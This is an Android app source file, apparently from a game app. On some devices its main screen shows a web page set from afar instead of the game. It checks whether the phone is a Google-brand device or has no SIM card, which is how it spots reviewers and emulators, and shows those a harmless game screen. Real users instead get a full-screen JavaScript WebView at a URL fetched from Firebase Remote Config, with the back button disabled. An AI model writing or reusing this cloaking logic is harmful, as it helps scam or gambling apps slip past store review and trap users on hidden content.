package com.osplimaaser.sresv;


import androidx.appcompat.app.AppCompatActivity;

import android.annotation.TargetApi;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.google.firebase.remoteconfig.FirebaseRemoteConfig;

import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    String path;
    private WebView webView;
    SharedPreferences preferences;
    SharedPreferences.Editor editor;

    static ArrayList<String> mListPackageName = new ArrayList();



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webView);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new MyWebViewClient());
        //SharedPreferences
        preferences=getSharedPreferences("LocalStorage",MODE_PRIVATE);
        editor=preferences.edit();

        //MainLogic
        path = preferences.getString("key","");

        if(path.isEmpty()){
            loadFire();
        }
        else{
            openWebView(path);
        }

    }


    //Main Logic
    public void loadFire(){

        //FireBase
        FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        String getUrl = mFirebaseRemoteConfig.getString("url");

        if (getUrl.isEmpty() || Build.BRAND.contains("google") || !isSimSupport(this)){
            Intent intent = new Intent(MainActivity.this, UnityActivity.class);
            startActivity(intent);
        }
        else {
            editor.putString("key",getUrl);
            editor.commit();
            openWebView(getUrl);
        }
    }

    //Delete Back Button on WebView
    @Override
    public void onBackPressed() { }

    //Open WebView
    public void openWebView(String url){
        webView.loadUrl(url);
    }

    private class MyWebViewClient extends WebViewClient {
        @TargetApi(Build.VERSION_CODES.N)
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            view.loadUrl(request.getUrl().toString());
            return true;
        }
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            view.loadUrl(url);
            return true;
        }
    }

    //Check if sim card is in
    public static boolean isSimSupport(Context context)
    {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        return !(tm.getSimState() == TelephonyManager.SIM_STATE_ABSENT);
    }

}